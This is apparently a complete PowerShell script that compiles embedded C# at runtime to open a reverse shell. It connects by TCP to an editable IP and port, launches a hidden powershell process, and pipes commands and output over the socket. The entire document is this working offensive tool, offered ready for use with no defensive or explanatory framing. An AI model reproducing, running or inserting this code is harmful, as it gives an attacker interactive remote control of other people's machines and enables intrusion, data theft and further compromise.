# Powershell reverse shell with C# 

#EEDIT IP & PORT
$ip = "127.0.0.1"
$port = "1234"
$shell = "powershell"

#random number, for dev purposes
$id = get-random

#C# sharp code
$code = @"

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace TestReverseShell
{
	public class ReverseShell$id
	{
        static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using (TcpClient client = new TcpClient(args[0],int.Parse(args[1]))) {
				using (Stream stream = client.GetStream()) {
					using (StreamReader rdr = new StreamReader(stream)) {

                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName                 = "$shell";
                        p.StartInfo.CreateNoWindow           = true;
                        p.StartInfo.UseShellExecute          = false;
                        p.StartInfo.RedirectStandardOutput   = true;
                        p.StartInfo.RedirectStandardInput    = true;
                        p.StartInfo.RedirectStandardError    = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0,strInput.Length);
                        }

					}
				}
			}
		}

        public static void CmdOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
        }
    }
}



"@;

Add-Type -Language CSharp $code
#[ReverseShell]::Main("127.0.0.1","1234")
Invoke-Expression "[TestReverseShell.ReverseShell$id]::Main(($ip,$port));"
```
